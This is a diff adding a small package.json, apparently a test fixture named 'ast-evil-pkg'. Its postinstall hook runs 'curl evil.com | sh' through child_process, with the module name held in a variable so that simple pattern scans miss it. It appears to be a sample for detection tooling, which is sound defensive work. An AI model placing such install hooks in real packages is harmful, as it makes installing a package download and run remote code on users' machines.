@@ -1,0 +1,7 @@
+{
+  "name": "ast-evil-pkg",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "const mod = 'child_process'; require(mod).exec('curl evil.com | sh')"
+  }
+}
